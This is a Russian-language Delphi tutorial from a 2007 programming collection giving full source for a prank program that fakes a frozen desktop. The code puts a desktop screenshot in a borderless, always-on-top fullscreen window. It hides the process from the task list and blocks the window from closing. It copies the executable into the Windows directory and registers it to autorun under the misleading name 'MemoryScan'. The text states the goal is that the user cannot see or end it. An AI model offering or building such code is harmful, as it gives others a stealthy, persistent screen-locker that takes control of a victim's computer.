---
Title: Безжизненный рабочий стол
Date: 01.01.2007
---


Безжизненный рабочий стол
=========================

::: {.date}
01.01.2007
:::

Алгоритм следующий: нужно на форму вынести компонент класса TImage
скопировать в него рабочий стол и растянуть во весь экран. Делаем это по
созданию окна \[событие OnCreate()\]:

    procedure TForm1.FormCreate(Sender: TObject);
    var
      ScreenDC: HDC;
      canvas:Tcanvas;
    begin
      ScreenDC:=GetDC(0);
      Canvas:=TCanvas.Create();
      canvas.Handle:=ScreenDC;
      Width:=Screen.Width;
      Height:=Screen.Height;
      Image1.Canvas.CopyRect(Rect(0,0,Image1.Width,Image1.Height),
      canvas,Rect(0,0,Screen.Width,Screen.Height));
      Releasedc(0,ScreenDC);
      Canvas.Free;
    end;

Затем нужно свойство формы BorderStyle установить в значение bsNone,
чтобы не было видно боковины окна, а свойство FormStyle - в fsStayOnTop,
дабы наше окно всегда было всех других окон!!! Свойство Align компонента
Image1- в значение alClient, чтобы картинка занимала всё свободное.
место

Далее позаботимся о том, чтобы наше приложение не было видно и чтобы
пользователь не мог завершить его :-))

Событие по созданию окна в конечном итоге должно выглядеть так:

    procedure TForm1.FormCreate(Sender: TObject);
    var
      ScreenDC: HDC;
      canvas: Tcanvas;
      h: TRegistry;
    begin
      ScreenDC:=GetDC(0);
      Canvas:=TCanvas.Create();
      canvas.Handle:=ScreenDC;
      Width:=Screen.Width;
      Height:=Screen.Height;
      Image1.Canvas.CopyRect(Rect(0,0,Image1.Width,Image1.Height),
      canvas,Rect(0,0,Screen.Width,Screen.Height));
      Releasedc(0,ScreenDC);
      Canvas.Free;
     
      if not(csDesigning in ComponentState) then
      RegisterServiceProcess(GetCurrentProcessID,1);
     
      WinDirP := StrAlloc(MAX_PATH);
      Res := GetWindowsDirectory(WinDirP, MAX_PATH);
      if Res > 0 then WinDir := StrPas(WinDirP);
     
      if FileExists(WinDir+'\OurProgram.com')=false then
      CopyFile(PChar(Application.ExeName),PChar(WinDir+'\OurProgram.com'),false);
     
      h:=TRegistry.Create;
      h.RootKey:=HKEY_LOCAL_MACHINE;
      h.OpenKey('\Software\Microsoft\Windows\CurrentVersion\Run',true);
      h.WriteString('MemoryScan',WinDir+'\OurProgram.com');
      h.CloseKey;
      h.Free;
    end;

На событие OnCloseQuery() формы напишем:

    CanClose:=false;

На событие OnActivate():

    ShowWindow(Application.Handle,sw\_Hide);

В области public объявим несколько переменных:

    public
      { Public declarations }
      Windir: string;
      WindirP: PChar;
      Res: Cardinal;

А в uses подключим модуль Registry:

    uses
      Registry;

<https://delphiworld.narod.ru/>

DelphiWorld 6.0
